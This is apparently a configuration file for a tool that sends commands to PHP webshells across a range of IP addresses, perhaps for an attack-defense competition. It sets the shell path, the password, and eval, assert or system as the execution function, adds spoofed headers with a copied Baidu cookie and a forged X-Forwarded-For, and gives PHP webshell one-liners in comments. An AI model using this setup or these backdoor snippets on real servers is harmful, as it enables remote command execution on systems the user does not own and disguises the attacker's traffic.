ips = "4.4.1-83.101"
port = 80
shell_path_uri = "0.php"
method_list = ["POST", "GET", "混合"]
method = "混合"
shell_function_list = ["eval", "assert", "system"]
shell_function = "system"
shell_password = "b"
Rpath = "/var/www/html"

headers = """
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Referer: https://www.baidu.com/baidu?wd=asdf&tn=monline_4_dg&ie=utf-8
Cookie: BIDUPSID=9E368AD92EA2209B14AC65333F6FBDDA; PSTM=1501422659; MCITY=-315%3A; BAIDUID=D997B1B05DB8F0004E1635E31D07F300:FG=1; COOKIE_SESSION=12994_0_3_3_0_1_0_0_3_1_0_0_0_0_0_0_0_0_1560273380%7C3%230_0_1560273380%7C1; BD_UPN=133252; BDRCVFR[gltLrB7qNCt]=mk3SLVN4HKm; delPer=0; BD_CK_SAM=1; PSINO=7; H_PS_PSSID=1437_21119_29135_29237_28518_29098_28834; H_PS_645EC=4530UEz0B7jxPbJedTa2m1EZnsMpIQOAt7dhg5uIUJRk8WQTnQ3wyMMdF7ZtVadNBArt; BDORZ=FFFB88E999055A3F8A630C64834BD6D0
X-Forwarded-For: 127.0.0.1
Connection: keep-alive"""


# 1、 $_POST[a]($_GET[b]);

# shell_path_uri = "0.php"
# method_list = ["POST", "GET", "混合"]
# method = "混合"
# shell_function_list = ["eval", "assert", "system"]
# shell_function = "system"
# shell_password = "b"



# 2、 $_GET[a]($_POST[b]);

# shell_path_uri = "0.php?a=eval"
# method_list = ["POST", "GET", "混合"]
# method = "POST"
# shell_function_list = ["eval", "assert", "system"]
# shell_function = "eval"
# shell_password = "b"
